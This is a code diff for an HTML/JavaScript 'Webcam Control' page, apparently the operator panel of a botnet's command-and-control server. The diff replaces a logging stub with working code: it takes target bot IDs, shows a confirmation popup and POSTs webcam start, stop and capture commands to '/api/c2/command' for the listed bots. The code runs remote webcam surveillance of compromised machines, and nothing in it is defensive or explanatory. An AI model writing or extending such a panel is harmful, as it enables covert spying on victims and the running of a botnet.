@@ -10,7 +10,8 @@
     <h1>Webcam Control</h1>
     <div class="panel">
         <h2>Commands</h2>
-        <button onclick="execute('start')">Start Feed</button>
+        <input type="text" id="targets" placeholder="Target bot IDs (comma separated)">
+        <button onclick="prepareStartFeed()">Start Feed</button>
         <button onclick="execute('stop')">Stop Feed</button>
         <button onclick="execute('capture')">Capture Image</button>
     </div>
@@ -18,13 +19,98 @@
         <h2>Output</h2>
         <div id="output"></div>
     </div>
+    <div id="popup" class="popup hidden">
+        <div class="popup-content">
+            <p id="popup-message"></p>
+            <button onclick="closePopup()">Close</button>
+        </div>
+    </div>
+    <div id="run-popup" class="popup hidden">
+        <div class="popup-content">
+            <h3>Prepare to Run</h3>
+            <p id="run-popup-message"></p>
+            <p id="run-popup-feedback"></p>
+            <button onclick="triggerRunFromPopup()">Run</button>
+            <button onclick="closeRunPopup()">Cancel</button>
+        </div>
+    </div>
     <script>
+        const popup = document.getElementById('popup');
+        const popupMessage = document.getElementById('popup-message');
+        const runPopup = document.getElementById('run-popup');
+        const runPopupMessage = document.getElementById('run-popup-message');
+        const runPopupFeedback = document.getElementById('run-popup-feedback');
+        let pendingRunAction = null;
+
+        function showPopup(message, isError = false) {
+            popupMessage.textContent = message;
+            popup.classList.remove('hidden');
+            popup.classList.toggle('error', isError);
+        }
+
+        function closePopup() {
+            popup.classList.add('hidden');
+            popup.classList.remove('error');
+        }
+
+        function openRunPopup(message, action) {
+            pendingRunAction = action;
+            runPopupMessage.textContent = message || 'Click Run to execute this command.';
+            runPopupFeedback.textContent = '';
+            runPopup.classList.remove('hidden');
+        }
+
+        function closeRunPopup() {
+            runPopup.classList.add('hidden');
+            pendingRunAction = null;
+        }
+
+        function triggerRunFromPopup() {
+            if (typeof pendingRunAction === 'function') {
+                const timestamp = new Date().toLocaleTimeString();
+                runPopupFeedback.textContent = 'Run button clicked at ' + timestamp + '.';
+                alert('Run button clicked at ' + timestamp + '.');
+                const action = pendingRunAction;
+                closeRunPopup();
+                action();
+            }
+        }
+
+        function prepareStartFeed() {
+            openRunPopup('Ready to start the webcam feed.', () => execute('start'));
+        }
+
+        function parseTargets() {
+            return document.getElementById('targets').value
+                .split(',')
+                .map(v => v.trim())
+                .filter(Boolean);
+        }
+
         function execute(command) {
-            const params = {
-                command: command
-            };
-            // Send command to C2 server
-            console.log('Executing with params:', params);
+            const targets = parseTargets();
+            if (!targets.length) {
+                showPopup('Please specify at least one target bot ID.', true);
+                return;
+            }
+
+            fetch('/api/c2/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    targets,
+                    command: JSON.stringify({ module: 'webcam', action: command }),
+                }),
+            })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === 'ok') {
+                        showPopup('Webcam command (' + command + ') queued for ' + targets.join(', '));
+                    } else {
+                        showPopup('C2 rejected command: ' + (data.message || 'unknown error'), true);
+                    }
+                })
+                .catch(err => showPopup('Failed to send command: ' + err, true));
         }
     </script>
 </body>
